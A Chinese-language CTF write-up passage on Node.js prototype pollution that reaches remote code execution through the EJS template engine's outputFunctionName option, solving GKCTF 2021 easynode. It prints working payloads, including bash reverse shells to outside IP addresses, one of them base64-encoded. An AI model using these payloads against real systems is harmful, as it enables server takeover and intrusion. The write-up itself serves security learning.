我们发现成功开启了计算机
#### 分析：
  * 在res.render处下断点
  * 进入到response.js，到1039行的app.render函数
    app.render(view,opts,done)
  * 继续跟进到application.js，到render函数，函数的最后一行tryRender
    tryRender(view,renderOptions,done)
  * 到同文件application.js中的tryRender函数，调用了`view.render(options, callback);`
    function tryRender(view,renderOptions,done){
        try{
            view.render(options,callback);
        }
        catch(err){
        callback(err)
        }
    }
  * 跟进render函数，到view.js的render函数，这里调用this.engine。
跟进`this.engine(this.path, options, callback);`，从这里进入到了模板渲染引擎 `ejs.js` 中
    return tryHandleCache(opt,data,cb);
跟进`tryHandleCache`，调用`handleCache`方法，传data参数
    try{
        result = handleCache(options)=(data);
    }
跟进handleCache，调用渲染模板的compile方法
    func = exports. compile(template,options);
跟进compile方法，调用`templ.compile()`，这个函数存在大量的渲染拼接，==其中会判断opts.outputFunctionName是否存在，这也是我们为什么要污染outputFunctionName属性的缘故==，判断成功会将`outputFunctionName`拼接到prepended中。
而prepended 在最后会被传递给 `this.source`并被带入函数执行
    compile:function(){
    ……
    if(!this.source){
        this.generateSource();
        prepended +=
            ' var __output = "";\n'+
            ' function __append(s) { if (s !== undefined && s !== null) __output +=s }\n';
        if(opts.outputFunctionName){
            prepended += ' var ' + opts.outputFunctionName + ' =__append;' + '\n';
        }
    }
    }
常用ejs模板引擎RCE的POC：
    {"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require(\'child_process\').execSync('calc');var __tmp2"}}
    {"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require(\'child_process\').exec('calc');var __tmp2"}}
    {"__proto__":{"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/120.77.200.94/8888 0>&1\"');var __tmp2"}}
## 实战：
### [GKCTF 2021]easynode：
顺便练一下JavaScript代码审计：
题目给出了源码，开局让我们先进行登录，所以我们首先要进行的就是如何使用admin进行登录的操作：
    const express = require('express');
    const format = require('string-format');
    const { select,close } = require('./tools');
    const app = new express();
    var extend = require("js-extend").extend
    const ejs = require('ejs');
    const {generateToken,verifyToken}  = require('./encrypt');
    var cookieParser = require('cookie-parser');
    app.use(express.urlencoded({ extended: true }));
    app.use(express.static((__dirname+'/public/')));
    app.use(cookieParser());
    let safeQuery =  async (username,password)=>{
        const waf = (str)=>{
            // console.log(str);
            blacklist = ['\\','\^',')','(','\"','\'']
            blacklist.forEach(element => {
                if (str == element){
                    str = "*";
                }
            });
            return str;
        }
        const safeStr = (str)=>{ for(let i = 0;i {
        const html = await ejs.renderFile(__dirname + "/public/index.html")
        res.writeHead(200, {"Content-Type": "text/html"});
        res.end(html)
    })
    app.post('/login',function(req,res,next){
        let username = req.body.username;
        let password = req.body.password;
        safeQuery(username,password).then(
            result =>{
                if(result[0]){
                    const token = generateToken(username)
                    res.json({
                        "msg":"yes","token":token
                    });
                }
                else{
                    res.json(
                        {"msg":"username or password wrong"}
                        );
                }
            }
        ).then(close()).catch(err=>{res.json({"msg":"something wrong!"});});
      })
    app.get("/admin",async (req,res,next) => {
        const token = req.cookies.token
        let result = verifyToken(token);
        if (result !='err'){
            username = result
            var sql = `select board from board where username = '${username}'`;
            var query = JSON.parse(JSON.stringify(await select(sql).then(close())));  
            board = JSON.parse(query[0].board);
            console.log(board);
            const html = await ejs.renderFile(__dirname + "/public/admin.ejs",{board,username})
            res.writeHead(200, {"Content-Type": "text/html"});
            res.end(html)
        } 
        else{
            res.json({'msg':'stop!!!'});
        }
    });
    app.post("/addAdmin",async (req,res,next) => {
        let username = req.body.username;
        let password = req.body.password;
        const token = req.cookies.token
        let result = verifyToken(token);
        if (result !='err'){
            gift = JSON.stringify({ [username]:{name:"Blue-Eyes White Dragon",ATK:"3000",DEF:"2500",URL:"https://ftp.bmp.ovh/imgs/2021/06/f66c705bd748e034.jpg"}});
            var sql = format('INSERT INTO test (username, password) VALUES ("{}","{}") ',username,password);
            select(sql).then(close()).catch( (err)=>{console.log(err)}); 
            var sql = format('INSERT INTO board (username, board) VALUES (\'{}\',\'{}\') ',username,gift);
            console.log(sql);
            select(sql).then(close()).catch( (err)=>{console.log(err)});
            res.end('add admin successful!')
        }
        else{
            res.end('stop!!!');
        }
    });
    app.post("/adminDIV",async(req,res,next) =>{
        const token = req.cookies.token
        var data =  JSON.parse(req.body.data)
        let result = verifyToken(token);
        if(result !='err'){
            username = result;
            var sql ='select board from board';
            var query = JSON.parse(JSON.stringify(await select(sql).then(close()))); 
            board = JSON.parse(query[0].board);
            console.log(board);
            for(var key in data){
                var addDIV = `{"${username}":{"${key}":"${data[key]}"}}`;
                extend(board,JSON.parse(addDIV));
            }
            sql = `update board SET board = '${JSON.stringify(board)}' where username = '${username}'`
            select(sql).then(close()).catch( (err)=>{console.log(err)}); 
            res.json({"msg":'addDiv successful!!!'});
        }
        else{
            res.end('nonono');
        }
    });
    app.listen(1337, () => {
        console.log(`App listening at port 1337`)
    })
我们思路首先看到路由方向：因为我们要进行登录，所以看到/login路由的地方：
    app.post('/login',function(req,res,next){
        let username = req.body.username;
        let password = req.body.password;
        safeQuery(username,password).then(
            result =>{
                if(result[0]){
                    const token = generateToken(username)
                    res.json({
                        "msg":"yes","token":token
                    });
                }
                else{
                    res.json(
                        {"msg":"username or password wrong"}
                        );
                }
            }
        ).then(close()).catch(err=>{res.json({"msg":"something wrong!"});});
      })
这个代码我们可以看到把username和password值取为post传的值，然后放在safeQuery里面进行处理，所以我们跟进safeQuery函数：
    let safeQuery =  async (username,password)=>{
        const waf = (str)=>{
            // console.log(str);
            blacklist = ['\\','\^',')','(','\"','\'']
            blacklist.forEach(element => {
                if (str == element){
                    str = "*";
                }
            });
            return str;
        }
        const safeStr = (str)=>{ for(let i = 0;i { for(let i = 0;i {
        const token = req.cookies.token
        var data =  JSON.parse(req.body.data)
        let result = verifyToken(token);
        if(result !='err'){
            username = result;
            var sql =`select board from board where username = "${username}"`;
            var query = JSON.parse(JSON.stringify(await select(sql).then(close().catch( (err)=>{console.log(err);} )))); 
            board = JSON.parse(JSON.stringify(query[0].board));
            for(var key in data){
                var addDIV =`{"${username}":{"${key}":"${(data[key])}"}}`;
                extend({},JSON.parse(addDIV));
            }
            sql = `update board SET board = '${JSON.stringify(board)}' where username = '${username}'`
            select(sql).then(close()).catch( ()=>{res.json({"msg":'DIV ERROR?'});}); 
            res.json({"msg":'addDiv successful!!!'});
        }
        else{
            res.end('nonono');
        }
    });
这个地方拿取了cookie的值，将post的内容以json形式传递给data，然后调用verifyToken函数验证token的有效性并将结果返回给result，如果验证通过就进入if语句当中，然后将用户名保存在变量username中，构建一个sql查询语句，从board中获取对应用户的数据
    // 调用 select 函数执行 SQL 查询，将结果转换为 JSON 格式
        var query = JSON.parse(JSON.stringify(await select(sql).then(close().catch( (err)=>{console.log(err);} )))); 
        // 从查询结果中获取该用户的布局数据
        board = JSON.parse(JSON.stringify(query[0].board));
然后遍历post传参的内容，并构建一个addDIV，将post内容写入，这个地方的extend函数其实就是一个merge函数，又因为addDIV的值来源于post内容，所以我们能够控制其值，从而达到原型链污染的效果。
    var addDIV =`{"${username}":{"${key}":"${(data[key])}"}}`
我们注意这个代码：addDIV由三部分组成，我们想要污染，我们就需要uesrname为 **proto**
,所以这里额外需要用addAdmin路由来进行添加，而addAdmin这个位置就需要我们login路由里面的token进行注册，这样才能成功注册用户名`__proto__`.
因为使用的是ejs模板，并进行了调用，我们就可以直接利用里面的outputFunctionName进行污染拼接：
    app.get("/admin",async (req,res,next) => {
        const token = req.cookies.token
        let result = verifyToken(token);
        if (result !='err'){
            username = result
            var sql = `select board from board where username = '${username}'`;
            var query = JSON.parse(JSON.stringify(await select(sql).then(close())));  
            board = JSON.parse(query[0].board);
            console.log(board);
            const html = await ejs.renderFile(__dirname + "/public/admin.ejs",{board,username})
            res.writeHead(200, {"Content-Type": "text/html"});
            res.end(html)
        } 
        else{
            res.json({'msg':'stop!!!'});
        }
    });
所以我们在adminDIVpost传参处构造payload：
    {"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/100.100.100.100/2333 0>&1\"');var __tmp2"}
因为这里是post传参，不是JSON，所以我们要对反弹shell的地方进行base64编码然后再解码，以免出现控制字符的干扰：
    {"outputFunctionName":"_tmp1;global.process.mainModule.require('child_process').exec('echo YmFzaCAtYyBcImJhc2ggLWkgPiYgL2Rldi90Y3AvMTAwLjEwMC4xMDAuMTAwLzIzMzMgMD4mMVwi|base64 -d|bash');var __tmp2"}